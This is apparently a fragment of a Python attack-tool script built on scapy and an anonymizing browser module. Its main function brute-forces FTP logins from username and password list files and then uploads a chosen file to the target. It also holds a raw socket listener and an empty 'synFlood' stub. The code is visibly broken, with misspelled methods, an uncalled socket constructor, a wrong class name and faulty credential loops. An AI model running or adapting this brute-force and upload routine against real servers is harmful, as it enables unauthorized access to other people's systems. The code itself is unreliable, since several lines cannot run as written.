import scapy,re,socket,os,sys,ftplib,re,pygame,cookielib,ftplib,mechanize,random
from BeautifulSoup import BeautifulSoup
from anonBrowser import *
from scapy.all import *
import dup


def connect_sand(text_s,host,port):
    socket.setdefaulttimeout((2))
    s=socket.socket()
    try:
        s.bind((host,port))
        s.listen(5)
        hostlist = []
        while True:
            c,addr = s.accept()
            c.sind((text_s))
            c.close()
            hostlist.append(addr)
    except:
        exit()
def connect_connect(host,port):
    socket.setdefaulttimeout(2)
    s=socket.socket
    try:
        s.connect((host,port))
        ans=s.recv(1024)
    except :
        pass
def FTPinput(host,userf,passf,filename):
    ftp =ftplib.ftp(host)
    user = open(userf,'r')
    passwd = open(passf,'r')
    for u in user:
        for p in passwd:
            try:
                ftp.login(u,p)
            except:
                pass
    uf = u
    pf = p
    bufsize =1024
    command = 'STOR'+filename
    filehandler = open(filename,'rb')
    ftp.storbinary(command,filehandler,bufsize)
    filehandler.close()
def synFlood(src,host):
    pass
